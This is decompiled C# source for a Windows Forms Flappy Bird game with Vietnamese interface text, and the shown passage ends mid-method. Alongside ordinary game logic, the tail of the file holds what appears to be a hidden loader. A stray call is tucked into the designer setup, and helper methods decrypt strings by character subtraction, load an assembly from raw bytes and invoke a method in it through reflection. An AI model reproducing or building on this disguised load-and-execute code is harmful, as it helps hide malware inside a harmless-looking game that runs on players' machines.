using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Reflection;
using System.Resources;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

[DesignerGenerated]
public class GForm2 : Form
{
	private int int_0;

	private int int_1;

	private int int_2;

	private int int_3;

	private int int_4;

	private int int_5;

	private object[] object_0;

	private IContainer icontainer_0;

	private bool bool_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("Bird")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private PictureBox pictureBox_0;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OngDuoi1")]
	[CompilerGenerated]
	private PictureBox pictureBox_1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OngTren1")]
	private PictureBox pictureBox_2;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OngTren2")]
	private PictureBox pictureBox_3;

	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OngDuoi2")]
	[CompilerGenerated]
	private PictureBox pictureBox_4;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("OngTren3")]
	private PictureBox pictureBox_5;

	[AccessedThroughProperty("OngDuoi3")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private PictureBox pictureBox_6;

	[AccessedThroughProperty("wall")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private PictureBox pictureBox_7;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Label2")]
	private Label label_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("StatusStrip1")]
	private StatusStrip statusStrip_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("X")]
	private ToolStripStatusLabel toolStripStatusLabel_0;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer2")]
	private Timer timer_1;

	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	[AccessedThroughProperty("Timer3")]
	private Timer timer_2;

	[AccessedThroughProperty("Timer4")]
	[CompilerGenerated]
	[DebuggerBrowsable(DebuggerBrowsableState.Never)]
	private Timer timer_3;

	internal virtual Timer Timer_0
	{
		[CompilerGenerated]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_5;
			Timer val = timer_0;
			if (val != null)
			{
				GForm2.smethod_108(val, eventHandler_);
			}
			timer_0 = value;
			val = timer_0;
			if (val != null)
			{
				GForm2.smethod_109(val, eventHandler_);
			}
		}
	}

	internal virtual PictureBox PictureBox_0
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			pictureBox_0 = value;
		}
	}

	internal virtual PictureBox PictureBox_1
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			pictureBox_1 = value;
		}
	}

	internal virtual PictureBox PictureBox_2
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			pictureBox_2 = value;
		}
	}

	internal virtual PictureBox PictureBox_3
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			pictureBox_3 = value;
		}
	}

	internal virtual PictureBox PictureBox_4
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			pictureBox_4 = value;
		}
	}

	internal virtual PictureBox PictureBox_5
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_5;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			pictureBox_5 = value;
		}
	}

	internal virtual PictureBox PictureBox_6
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_6;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			pictureBox_6 = value;
		}
	}

	internal virtual PictureBox PictureBox_7
	{
		[CompilerGenerated]
		get
		{
			return pictureBox_7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			pictureBox_7 = value;
		}
	}

	internal virtual Label Label_0
	{
		[CompilerGenerated]
		get
		{
			return label_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			label_0 = value;
		}
	}

	internal virtual StatusStrip StatusStrip_0
	{
		[CompilerGenerated]
		get
		{
			return statusStrip_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			statusStrip_0 = value;
		}
	}

	internal virtual ToolStripStatusLabel ToolStripStatusLabel_0
	{
		[CompilerGenerated]
		get
		{
			return toolStripStatusLabel_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			toolStripStatusLabel_0 = value;
		}
	}

	internal virtual Timer Timer_1
	{
		[CompilerGenerated]
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_8;
			Timer val = timer_1;
			if (val != null)
			{
				GForm2.smethod_108(val, eventHandler_);
			}
			timer_1 = value;
			val = timer_1;
			if (val != null)
			{
				GForm2.smethod_109(val, eventHandler_);
			}
		}
	}

	internal virtual Timer Timer_2
	{
		[CompilerGenerated]
		get
		{
			return timer_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_13;
			Timer val = timer_2;
			if (val != null)
			{
				GForm2.smethod_108(val, eventHandler_);
			}
			timer_2 = value;
			val = timer_2;
			if (val != null)
			{
				GForm2.smethod_109(val, eventHandler_);
			}
		}
	}

	internal virtual Timer Timer_3
	{
		[CompilerGenerated]
		get
		{
			return timer_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler eventHandler_ = method_14;
			Timer val = timer_3;
			if (val != null)
			{
				GForm2.smethod_108(val, eventHandler_);
			}
			timer_3 = value;
			val = timer_3;
			if (val != null)
			{
				GForm2.smethod_109(val, eventHandler_);
			}
		}
	}

	public GForm2()
	{
		//IL_000e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0018: Expected O, but got Unknown
		//IL_0020: Unknown result type (might be due to invalid IL or missing references)
		//IL_002a: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		GForm2.smethod_7((Form)(object)this, new FormClosedEventHandler(method_1));
		GForm2.smethod_8((Control)(object)this, new KeyEventHandler(method_2));
		GForm2.smethod_9((Control)(object)this, new MouseEventHandler(method_3));
		GForm2.smethod_10((Form)(object)this, (EventHandler)method_4);
		int_0 = 0;
		int_1 = 1;
		int_2 = 0;
		int_3 = 456;
		int_4 = 4;
		int_5 = 15;
		object_0 = new object[7] { PictureBox_1, PictureBox_4, PictureBox_6, PictureBox_2, PictureBox_3, PictureBox_5, PictureBox_7 };
		bool_0 = false;
		method_15();
	}

	private void method_0()
	{
		GForm2.smethod_11((Control)(object)PictureBox_1, bool_1: false);
		GForm2.smethod_11((Control)(object)PictureBox_4, bool_1: false);
		GForm2.smethod_11((Control)(object)PictureBox_6, bool_1: false);
		GForm2.smethod_11((Control)(object)PictureBox_2, bool_1: false);
		GForm2.smethod_11((Control)(object)PictureBox_3, bool_1: false);
		GForm2.smethod_11((Control)(object)PictureBox_5, bool_1: false);
		GForm2.smethod_11((Control)(object)PictureBox_7, bool_1: false);
		GForm2.smethod_11((Control)(object)PictureBox_0, bool_1: false);
		GForm2.smethod_12((Control)(object)PictureBox_1, 303);
		GForm2.smethod_12((Control)(object)PictureBox_2, GForm2.smethod_13((Control)(object)PictureBox_1));
		GForm2.smethod_12((Control)(object)PictureBox_4, 478);
		GForm2.smethod_12((Control)(object)PictureBox_3, GForm2.smethod_13((Control)(object)PictureBox_4));
		GForm2.smethod_12((Control)(object)PictureBox_6, 653);
		GForm2.smethod_12((Control)(object)PictureBox_5, GForm2.smethod_13((Control)(object)PictureBox_6));
		GForm2.smethod_14((Control)(object)Label_0);
		GForm2.smethod_15((Control)(object)PictureBox_0, 184);
		int_2 = 0;
		GForm2.smethod_16(Timer_1, bool_1: false);
		GForm2.smethod_16(Timer_0, bool_1: false);
		int_2 = 0;
		GForm2.smethod_17((ToolStripItem)(object)ToolStripStatusLabel_0, "Điểm: 0");
		int_1 = 1;
		int_0 = 0;
		method_6(PictureBox_2, PictureBox_1);
		method_6(PictureBox_3, PictureBox_4);
		method_6(PictureBox_5, PictureBox_6);
		GForm2.smethod_16(Timer_2, bool_1: false);
	}

	private void method_1(object sender, FormClosedEventArgs e)
	{
	}

	private void method_2(object sender, KeyEventArgs e)
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_0008: Invalid comparison between Unknown and I4
		if ((int)GForm2.smethod_18(e) == 32)
		{
			checked
			{
				if (!GForm2.smethod_19(Timer_0))
				{
					GForm2.smethod_16(Timer_0, bool_1: true);
					GForm2.smethod_16(Timer_1, bool_1: true);
					GForm2.smethod_20((Control)(object)Label_0);
				}
				else
				{
					int_0 -= int_5;
				}
			}
		}
	}

	private void method_3(object sender, MouseEventArgs e)
	{
		checked
		{
			if (!GForm2.smethod_19(Timer_0))
			{
				GForm2.smethod_16(Timer_0, bool_1: true);
				GForm2.smethod_16(Timer_1, bool_1: true);
				GForm2.smethod_20((Control)(object)Label_0);
			}
			else
			{
				int_0 -= int_5;
			}
		}
	}

	private void method_4(object sender, EventArgs e)
	{
		GForm2.smethod_11((Control)(object)PictureBox_1, bool_1: false);
		GForm2.smethod_11((Control)(object)PictureBox_4, bool_1: false);
		GForm2.smethod_11((Control)(object)PictureBox_6, bool_1: false);
		GForm2.smethod_11((Control)(object)PictureBox_2, bool_1: false);
		GForm2.smethod_11((Control)(object)PictureBox_3, bool_1: false);
		GForm2.smethod_11((Control)(object)PictureBox_5, bool_1: false);
		GForm2.smethod_11((Control)(object)PictureBox_7, bool_1: false);
		GForm2.smethod_11((Control)(object)PictureBox_0, bool_1: false);
		GForm2.smethod_16(Timer_1, bool_1: false);
		GForm2.smethod_16(Timer_0, bool_1: false);
		method_0();
	}

	private void method_5(object sender, EventArgs e)
	{
		method_10();
		checked
		{
			PictureBox control_;
			GForm2.smethod_12((Control)(object)(control_ = PictureBox_2), GForm2.smethod_13((Control)(object)control_) - int_4);
			GForm2.smethod_12((Control)(object)PictureBox_1, GForm2.smethod_13((Control)(object)PictureBox_2));
			GForm2.smethod_12((Control)(object)(control_ = PictureBox_3), GForm2.smethod_13((Control)(object)control_) - int_4);
			GForm2.smethod_12((Control)(object)PictureBox_4, GForm2.smethod_13((Control)(object)PictureBox_3));
			GForm2.smethod_12((Control)(object)(control_ = PictureBox_5), GForm2.smethod_13((Control)(object)control_) - int_4);
			GForm2.smethod_12((Control)(object)PictureBox_6, GForm2.smethod_13((Control)(object)PictureBox_5));
			if (GForm2.smethod_21((Control)(object)PictureBox_2) <= 0)
			{
				GForm2.smethod_12((Control)(object)PictureBox_2, int_3);
				GForm2.smethod_12((Control)(object)PictureBox_1, int_3);
				method_6(PictureBox_2, PictureBox_1);
			}
			if (GForm2.smethod_21((Control)(object)PictureBox_3) <= 0)
			{
				GForm2.smethod_12((Control)(object)PictureBox_3, int_3);
				GForm2.smethod_12((Control)(object)PictureBox_4, int_3);
				method_6(PictureBox_3, PictureBox_4);
			}
			if (GForm2.smethod_21((Control)(object)PictureBox_5) <= 0)
			{
				GForm2.smethod_12((Control)(object)PictureBox_5, int_3);
				GForm2.smethod_12((Control)(object)PictureBox_6, int_3);
				method_6(PictureBox_5, PictureBox_6);
			}
			GForm2.smethod_15((Control)(object)(control_ = PictureBox_0), GForm2.smethod_22((Control)(object)control_) + int_0);
			int_0 += int_1;
		}
	}

	private void method_6(PictureBox pictureBox_8, PictureBox pictureBox_9)
	{
		checked
		{
			GForm2.smethod_15((Control)(object)pictureBox_9, (int)GForm2.smethod_24((double)(70f + 290f * GForm2.smethod_23())));
			if (GForm2.smethod_22((Control)(object)pictureBox_9) < 125)
			{
				method_6(pictureBox_8, pictureBox_9);
			}
			GForm2.smethod_15((Control)(object)pictureBox_8, GForm2.smethod_22((Control)(object)pictureBox_9) - 420);
			method_12();
		}
	}

	private void method_7(object sender, EventArgs e)
	{
	}

	private void method_8(object sender, EventArgs e)
	{
		method_12();
	}

	private bool method_9(object object_1)
	{
		bool result = false;
		if (GForm2.smethod_33(GForm2.smethod_29(GForm2.smethod_29(checked(GForm2.smethod_29(GForm2.smethod_29(GForm2.smethod_29(GForm2.smethod_27((object)(GForm2.smethod_22((Control)(object)PictureBox_0) + GForm2.smethod_25((Control)(object)PictureBox_0) - 5), GForm2.smethod_26(object_1, (Type)null, "top", new object[0], (string[])null, (Type[])null, (bool[])null), bool_1: false), GForm2.smethod_27(GForm2.smethod_28(GForm2.smethod_26(object_1, (Type)null, "top", new object[0], (string[])null, (Type[])null, (bool[])null), GForm2.smethod_26(object_1, (Type)null, "Height", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)GForm2.smethod_22((Control)(object)PictureBox_0), bool_1: false)), GForm2.smethod_27((object)(GForm2.smethod_13((Control)(object)PictureBox_0) + GForm2.smethod_30((Control)(object)PictureBox_0) - 5), GForm2.smethod_26(object_1, (Type)null, "left", new object[0], (string[])null, (Type[])null, (bool[])null), bool_1: false)), GForm2.smethod_27(GForm2.smethod_28(GForm2.smethod_26(object_1, (Type)null, "left", new object[0], (string[])null, (Type[])null, (bool[])null), GForm2.smethod_26(object_1, (Type)null, "width", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)(GForm2.smethod_13((Control)(object)PictureBox_0) + 5), bool_1: false))), (object)GForm2.smethod_31((Control)(object)PictureBox_0)), GForm2.smethod_32(GForm2.smethod_26(object_1, (Type)null, "visible", new object[0], (string[])null, (Type[])null, (bool[])null), (object)true, bool_1: false))))
		{
			result = true;
		}
		return result;
	}

	private void method_10()
	{
		//IL_009d: Unknown result type (might be due to invalid IL or missing references)
		if (method_9(PictureBox_1) | method_9(PictureBox_4) | method_9(PictureBox_6) | method_9(PictureBox_2) | method_9(PictureBox_3) | method_9(PictureBox_5) | method_9(PictureBox_7))
		{
			GForm2.smethod_16(Timer_0, bool_1: false);
			GForm2.smethod_16(Timer_1, bool_1: false);
			GForm2.smethod_16(Timer_2, bool_1: true);
			object object_ = GForm2.smethod_36(GForm2.smethod_35("Trò chơi kết thúc\r\n\r\nSố điểm: ", GForm2.smethod_34(int_2)), "Game Over", (MessageBoxButtons)0, (MessageBoxIcon)64);
			if (GForm2.smethod_37(object_, (object)(MsgBoxResult)1, bool_1: false))
			{
				method_0();
			}
		}
	}

	private bool method_11(object object_1)
	{
		if (GForm2.smethod_33(GForm2.smethod_29(GForm2.smethod_27(GForm2.smethod_26(GForm2.smethod_26(object_1, (Type)null, "location", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "x", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, bool_1: false), GForm2.smethod_39(GForm2.smethod_26(GForm2.smethod_26(object_1, (Type)null, "location", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "x", new object[0], (string[])null, (Type[])null, (bool[])null), (object)checked(GForm2.smethod_38((Control)(object)PictureBox_0).X + 5), bool_1: false))))
		{
			return true;
		}
		return false;
	}

	private void method_12()
	{
		checked
		{
			if (method_11(PictureBox_1) | method_11(PictureBox_4) | method_11(PictureBox_6))
			{
				int_2++;
				GForm2.smethod_17((ToolStripItem)(object)ToolStripStatusLabel_0, GForm2.smethod_35("Điểm: ", int_2.ToString()));
				GForm2.smethod_16(Timer_1, bool_1: false);
			}
		}
	}

	private void method_13(object sender, EventArgs e)
	{
		GForm2.smethod_41(GForm2.smethod_40(PictureBox_0), (RotateFlipType)1);
		checked
		{
			if (GForm2.smethod_22((Control)(object)PictureBox_0) + GForm2.smethod_25((Control)(object)PictureBox_0) < GForm2.smethod_22((Control)(object)PictureBox_7))
			{
				PictureBox control_;
				GForm2.smethod_15((Control)(object)(control_ = PictureBox_0), GForm2.smethod_22((Control)(object)control_) + 8);
			}
		}
	}

	private void method_14(object sender, EventArgs e)
	{
		if ((GForm2.smethod_38((Control)(object)PictureBox_1).X < 0) | (GForm2.smethod_38((Control)(object)PictureBox_4).X < 0) | (GForm2.smethod_38((Control)(object)PictureBox_6).X < 0))
		{
			GForm2.smethod_16(Timer_1, bool_1: true);
		}
		if (GForm2.smethod_22((Control)(object)PictureBox_0) < 3)
		{
			int_5 = -1;
			GForm2.smethod_15((Control)(object)PictureBox_0, 3);
		}
		else
		{
			int_5 = 15;
		}
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			if (disposing && icontainer_0 != null)
			{
				GForm2.smethod_42((IDisposable)icontainer_0);
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void method_15()
	{
		//IL_01e6: Unknown result type (might be due to invalid IL or missing references)
		//IL_01f0: Expected O, but got Unknown
		//IL_0257: Unknown result type (might be due to invalid IL or missing references)
		//IL_0261: Expected O, but got Unknown
		//IL_02c8: Unknown result type (might be due to invalid IL or missing references)
		//IL_02d2: Expected O, but got Unknown
		//IL_033c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0346: Expected O, but got Unknown
		//IL_03b0: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ba: Expected O, but got Unknown
		//IL_0424: Unknown result type (might be due to invalid IL or missing references)
		//IL_042e: Expected O, but got Unknown
		//IL_079b: Unknown result type (might be due to invalid IL or missing references)
		//IL_07a5: Expected O, but got Unknown
		icontainer_0 = GForm2.smethod_43();
		ComponentResourceManager resourceManager_ = GForm2.smethod_45(GForm2.smethod_44(typeof(GForm2).TypeHandle));
		Timer_0 = GForm2.smethod_46(icontainer_0);
		PictureBox_0 = GForm2.smethod_47();
		PictureBox_1 = GForm2.smethod_47();
		PictureBox_2 = GForm2.smethod_47();
		PictureBox_3 = GForm2.smethod_47();
		PictureBox_4 = GForm2.smethod_47();
		PictureBox_5 = GForm2.smethod_47();
		PictureBox_6 = GForm2.smethod_47();
		PictureBox_7 = GForm2.smethod_47();
		Label_0 = GForm2.smethod_48();
		StatusStrip_0 = GForm2.smethod_49();
		ToolStripStatusLabel_0 = GForm2.smethod_50();
		Timer_1 = GForm2.smethod_46(icontainer_0);
		Timer_2 = GForm2.smethod_46(icontainer_0);
		Timer_3 = GForm2.smethod_46(icontainer_0);
		GForm2.smethod_51((ISupportInitialize)PictureBox_0);
		GForm2.smethod_51((ISupportInitialize)PictureBox_1);
		GForm2.smethod_51((ISupportInitialize)PictureBox_2);
		GForm2.smethod_51((ISupportInitialize)PictureBox_3);
		GForm2.smethod_51((ISupportInitialize)PictureBox_4);
		GForm2.smethod_51((ISupportInitialize)PictureBox_5);
		GForm2.smethod_51((ISupportInitialize)PictureBox_6);
		GForm2.smethod_51((ISupportInitialize)PictureBox_7);
		GForm2.smethod_52((Control)(object)StatusStrip_0);
		GForm2.smethod_53((Control)(object)this);
		GForm2.smethod_54(Timer_0, 40);
		GForm2.smethod_55((Control)(object)PictureBox_0, Color.Transparent);
		GForm2.smethod_56((Control)(object)PictureBox_0, (ImageLayout)0);
		GForm2.smethod_57(PictureBox_0, (Image)null);
		GForm2.smethod_58((Control)(object)PictureBox_0, new Point(12, 184));
		GForm2.smethod_59((Control)(object)PictureBox_0, "Bird");
		GForm2.smethod_60((Control)(object)PictureBox_0, new Size(44, 35));
		GForm2.smethod_61(PictureBox_0, (PictureBoxSizeMode)4);
		GForm2.smethod_62(PictureBox_0, 0);
		GForm2.smethod_63(PictureBox_0, bool_1: false);
		GForm2.smethod_65((Control)(object)PictureBox_1, (Image)GForm2.smethod_64((ResourceManager)resourceManager_, "OngDuoi1.BackgroundImage"));
		GForm2.smethod_58((Control)(object)PictureBox_1, new Point(48, 258));
		GForm2.smethod_59((Control)(object)PictureBox_1, "OngDuoi1");
		GForm2.smethod_60((Control)(object)PictureBox_1, new Size(53, 323));
		GForm2.smethod_62(PictureBox_1, 1);
		GForm2.smethod_63(PictureBox_1, bool_1: false);
		GForm2.smethod_65((Control)(object)PictureBox_2, (Image)GForm2.smethod_64((ResourceManager)resourceManager_, "OngTren1.BackgroundImage"));
		GForm2.smethod_58((Control)(object)PictureBox_2, new Point(48, -174));
		GForm2.smethod_59((Control)(object)PictureBox_2, "OngTren1");
		GForm2.smethod_60((Control)(object)PictureBox_2, new Size(53, 320));
		GForm2.smethod_62(PictureBox_2, 2);
		GForm2.smethod_63(PictureBox_2, bool_1: false);
		GForm2.smethod_65((Control)(object)PictureBox_3, (Image)GForm2.smethod_64((ResourceManager)resourceManager_, "OngTren2.BackgroundImage"));
		GForm2.smethod_58((Control)(object)PictureBox_3, new Point(141, -174));
		GForm2.smethod_59((Control)(object)PictureBox_3, "OngTren2");
		GForm2.smethod_60((Control)(object)PictureBox_3, new Size(53, 320));
		GForm2.smethod_62(PictureBox_3, 4);
		GForm2.smethod_63(PictureBox_3, bool_1: false);
		GForm2.smethod_65((Control)(object)PictureBox_4, (Image)GForm2.smethod_64((ResourceManager)resourceManager_, "OngDuoi2.BackgroundImage"));
		GForm2.smethod_58((Control)(object)PictureBox_4, new Point(141, 258));
		GForm2.smethod_59((Control)(object)PictureBox_4, "OngDuoi2");
		GForm2.smethod_60((Control)(object)PictureBox_4, new Size(53, 323));
		GForm2.smethod_62(PictureBox_4, 3);
		GForm2.smethod_63(PictureBox_4, bool_1: false);
		GForm2.smethod_65((Control)(object)PictureBox_5, (Image)GForm2.smethod_64((ResourceManager)resourceManager_, "OngTren3.BackgroundImage"));
		GForm2.smethod_58((Control)(object)PictureBox_5, new Point(236, -174));
		GForm2.smethod_59((Control)(object)PictureBox_5, "OngTren3");
		GForm2.smethod_60((Control)(object)PictureBox_5, new Size(53, 320));
		GForm2.smethod_62(PictureBox_5, 6);
		GForm2.smethod_63(PictureBox_5, bool_1: false);
		GForm2.smethod_65((Control)(object)PictureBox_6, (Image)GForm2.smethod_64((ResourceManager)resourceManager_, "OngDuoi3.BackgroundImage"));
		GForm2.smethod_58((Control)(object)PictureBox_6, new Point(236, 258));
		GForm2.smethod_59((Control)(object)PictureBox_6, "OngDuoi3");
		GForm2.smethod_60((Control)(object)PictureBox_6, new Size(53, 323));
		GForm2.smethod_62(PictureBox_6, 5);
		GForm2.smethod_63(PictureBox_6, bool_1: false);
		GForm2.smethod_58((Control)(object)PictureBox_7, new Point(-3, 397));
		GForm2.smethod_59((Control)(object)PictureBox_7, "wall");
		GForm2.smethod_60((Control)(object)PictureBox_7, new Size(292, 113));
		GForm2.smethod_62(PictureBox_7, 7);
		GForm2.smethod_63(PictureBox_7, bool_1: false);
		GForm2.smethod_55((Control)(object)Label_0, Color.Transparent);
		GForm2.smethod_67((Control)(object)Label_0, GForm2.smethod_66("Times New Roman", 12f, (FontStyle)3, (GraphicsUnit)3, (byte)0));
		GForm2.smethod_68((Control)(object)Label_0, Color.FromArgb(192, 192, 0));
		GForm2.smethod_58((Control)(object)Label_0, new Point(86, 177));
		GForm2.smethod_59((Control)(object)Label_0, "Label2");
		GForm2.smethod_60((Control)(object)Label_0, new Size(172, 47));
		GForm2.smethod_69((Control)(object)Label_0, 10);
		GForm2.smethod_70((Control)(object)Label_0, (object)"");
		GForm2.smethod_71(Label_0, "  Dùng phím space hoặc     chuột để điều khiển");
		GForm2.smethod_72((ToolStrip)(object)StatusStrip_0, bool_1: false);
		GForm2.smethod_73((ToolStrip)(object)StatusStrip_0, bool_1: false);
		GForm2.smethod_75(GForm2.smethod_74((ToolStrip)(object)StatusStrip_0), (ToolStripItem[])(object)new ToolStripItem[1] { (ToolStripItem)ToolStripStatusLabel_0 });
		GForm2.smethod_58((Control)(object)StatusStrip_0, new Point(0, 488));
		GForm2.smethod_59((Control)(object)StatusStrip_0, "StatusStrip1");
		GForm2.smethod_60((Control)(object)StatusStrip_0, new Size(288, 22));
		GForm2.smethod_76(StatusStrip_0, bool_1: false);
		GForm2.smethod_69((Control)(object)StatusStrip_0, 12);
		GForm2.smethod_77((Control)(object)StatusStrip_0, "StatusStrip1");
		GForm2.smethod_78((ToolStripItem)(object)ToolStripStatusLabel_0, Color.Transparent);
		GForm2.smethod_79((ToolStripItem)(object)ToolStripStatusLabel_0, "X");
		GForm2.smethod_80((ToolStripItem)(object)ToolStripStatusLabel_0, new Size(119, 17));
		GForm2.smethod_17((ToolStripItem)(object)ToolStripStatusLabel_0, "ToolStripStatusLabel1");
		GForm2.smethod_54(Timer_1, 1);
		GForm2.smethod_54(Timer_2, 40);
		GForm2.smethod_16(Timer_3, bool_1: true);
		GForm2.smethod_54(Timer_3, 1);
		GForm2.smethod_81((ContainerControl)(object)this, new SizeF(6f, 13f));
		GForm2.smethod_82((ContainerControl)(object)this, (AutoScaleMode)1);
		GForm2.smethod_83((Form)(object)this, (AutoSizeMode)0);
		GForm2.smethod_85((Form)(object)this, GForm2.smethod_84());
		GForm2.smethod_86((Form)(object)this, new Size(288, 510));
		GForm2.smethod_88(GForm2.smethod_87((Control)(object)this), (Control)(object)StatusStrip_0);
		GForm2.smethod_88(GForm2.smethod_87((Control)(object)this), (Control)(object)Label_0);
		GForm2.smethod_88(GForm2.smethod_87((Control)(object)this), (Control)(object)PictureBox_7);
		GForm2.smethod_88(GForm2.smethod_87((Control)(object)this), (Control)(object)PictureBox_5);
		GForm2.smethod_88(GForm2.smethod_87((Control)(object)this), (Control)(object)PictureBox_6);
		GForm2.smethod_88(GForm2.smethod_87((Control)(object)this), (Control)(object)PictureBox_3);
		GForm2.smethod_88(GForm2.smethod_87((Control)(object)this), (Control)(object)PictureBox_4);
		GForm2.smethod_88(GForm2.smethod_87((Control)(object)this), (Control)(object)PictureBox_2);
		GForm2.smethod_88(GForm2.smethod_87((Control)(object)this), (Control)(object)PictureBox_1);
		GForm2.smethod_88(GForm2.smethod_87((Control)(object)this), (Control)(object)PictureBox_0);
		GForm2.smethod_89((Form)(object)this, (Icon)GForm2.smethod_64((ResourceManager)resourceManager_, "$this.Icon"));
		GForm2.smethod_90((Form)(object)this, bool_1: false);
		GForm2.smethod_91((Control)(object)this, "saffffafFFFFFFF");
		GForm2.smethod_92((Form)(object)this, "Flappy Bird (Windows) @NTH");
		GForm2.smethod_93((ISupportInitialize)PictureBox_0);
		GForm2.smethod_93((ISupportInitialize)PictureBox_1);
		GForm2.smethod_93((ISupportInitialize)PictureBox_2);
		GForm2.smethod_93((ISupportInitialize)PictureBox_3);
		GForm2.smethod_93((ISupportInitialize)PictureBox_4);
		smethod_4((AutoScaleMode)1);
		GForm2.smethod_93((ISupportInitialize)PictureBox_5);
		GForm2.smethod_93((ISupportInitialize)PictureBox_6);
		GForm2.smethod_93((ISupportInitialize)PictureBox_7);
		GForm2.smethod_94((Control)(object)StatusStrip_0, bool_1: false);
		GForm2.smethod_95((Control)(object)StatusStrip_0);
		GForm2.smethod_96((Control)(object)this, bool_1: false);
	}

	private static void smethod_0(Type type_0, int int_6)
	{
		object[] array = new object[3]
		{
			GClass0.String_1,
			GClass0.String_0,
			"FlappyBird"
		};
		MethodInfo object_ = GForm2.smethod_97(type_0)[3];
		GForm2.smethod_98((object)object_, (Type)null, "Invoke", new object[2] { 0, array }, (string[])null, (bool[])null);
	}

	private static void smethod_1(object object_1)
	{
		Type type_ = GForm2.smethod_99((Assembly)object_1)[0];
		smethod_0(type_, 5);
	}

	private static object smethod_2(byte[] byte_0, bool bool_1)
	{
		return GForm2.smethod_101(GForm2.smethod_100(), byte_0);
	}

	public static object smethod_3(string string_0, string string_1)
	{
		string text = "";
		int num = GForm2.smethod_102(string_0);
		checked
		{
			for (int i = 1; i <= num; i++)
			{
				int int_ = unchecked((int)GForm2.smethod_103(string_0, i)) - unchecked((int)GForm2.smethod_103(string_1, checked(unchecked(i % GForm2.smethod_102(string_1)) + 1)));
				text = GForm2.smethod_35(text, GForm2.smethod_105(GForm2.smethod_104(int_)));
			}
			return text;
		}
	}

	public static string smethod_4(AutoScaleMode autoScaleMode_0)
	{
